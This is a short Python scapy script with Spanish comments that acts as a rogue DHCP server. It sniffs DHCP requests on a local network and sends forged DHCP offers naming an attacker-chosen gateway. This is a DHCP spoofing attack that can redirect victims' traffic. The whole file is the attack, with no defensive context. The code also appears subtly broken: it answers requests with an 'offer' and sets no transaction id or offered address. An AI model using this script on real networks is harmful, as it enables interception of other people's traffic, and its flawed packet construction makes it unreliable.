import scapy.all as scapy

# Definir la función para enviar respuestas DHCP falsas
def send_dhcp_response(packet):
    print("Paquete recibido")
    if packet[scapy.DHCP] and packet[scapy.DHCP].options[0][1] == 3:
        print("Paquete DHCP detectado")
        # Verificar si es una solicitud DHCP
        dhcp_response = scapy.Ether(dst="00:0c:29:16:6a:f4") / scapy.IP(src="192.168.93.135", dst="255.255.255.255") / scapy.UDP(sport=67, dport=68) / scapy.BOOTP(chaddr=packet[scapy.Ether].src) / scapy.DHCP(options=[("message-type", "offer"), ("subnet_mask", "255.255.255.0"), ("router", "192.168.93.1"), ("domain", "example.com")])
        
        print("Enviando respuesta DHCP falsa")
        scapy.sendp(dhcp_response, iface="eth0")  # Especificar la interfaz de red correcta

# Capturar paquetes DHCP
print("Iniciando captura de paquetes DHCP")
scapy.sniff(filter="udp and (port 67 or 68)", prn=send_dhcp_response)
